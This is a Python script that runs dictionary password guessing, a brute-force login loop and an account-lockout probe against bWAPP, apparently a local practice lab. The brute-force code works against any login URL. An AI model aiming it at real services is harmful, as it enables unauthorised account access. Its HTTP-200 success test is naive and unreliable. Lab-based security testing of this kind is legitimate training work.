import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time

def load_passwords(file_path):
    """
    Loads passwords from a file.

    Args:
        file_path (str): The path to the file containing passwords.

    Returns:
        list: A list of passwords.
    """
    with open(file_path, 'r') as file:
        passwords = file.read().splitlines()
    return passwords

def check_common_passwords(url, username, passwords):
    """
    Checks the given URL for weak passwords from a list of common passwords.

    Args:
        url (str): The URL of the login page.
        username (str): The username to use for login.
        passwords (list): A list of passwords to check.

    Returns:
        tuple: A tuple containing a boolean indicating if a weak password was found,
               and a description message.
    """
    for password in passwords:
        response = requests.post(url, data={'username': username, 'password': password})
        if response.status_code == 200:
            message = f"Weak password found: {password}"
            print(message)
            return True, message
    return False, "No weak passwords found."

def brute_force_attack(url, username, password_list):
    """
    Performs a brute force attack to find the password for the given username.

    Args:
        url (str): The URL of the login page.
        username (str): The username to use for login.
        password_list (list): A list of passwords to try.

    Returns:
        tuple: A tuple containing a boolean indicating if a password was found,
               and a description message.
    """
    for password in password_list:
        response = requests.post(url, data={'username': username, 'password': password})
        if response.status_code == 200:
            message = f"Password found: {password}"
            print(message)
            return True, message
    return False, "No passwords found via brute force."

def check_account_lockout(url, username):
    """
    Checks if the given URL has an account lockout mechanism by sending multiple failed login attempts.

    Args:
        url (str): The URL of the login page.
        username (str): The username to use for login.

    Returns:
        tuple: A tuple containing a boolean indicating if the account lockout mechanism is absent,
               and a description message.
    """
    for i in range(10):
        response = requests.post(url, data={'username': username, 'password': 'wrongpassword'})
        if response.status_code == 429:  # Too Many Requests
            message = "Account lockout mechanism detected."
            print(message)
            return False, message  # Changed to False since this is not a vulnerability
    message = "No account lockout mechanism detected."
    print(message)
    return True, message  # Changed to True since this is a vulnerability

def main():
    """
    Main function to perform security checks on the target URL.

    Args:
        None

    Returns:
        None
    """
    target_url = 'http://localhost/bWAPP/ba_weak_pwd.php'  
    username = 'bee'
    password_file = 'common-password.txt'
    
    # Load passwords from file
    passwords = load_passwords(password_file)
    
    # Check for common weak passwords
    vulnerabilities_found, description = check_common_passwords(target_url, username, passwords)
    print(description)
    
    # Simulate brute force attack
    vulnerabilities_found, description = brute_force_attack(target_url, username, passwords)
    print(description)
    
    # Check for account lockout mechanism
    vulnerabilities_found, description = check_account_lockout(target_url, username)
    print(description)

if __name__ == "__main__":
    main()
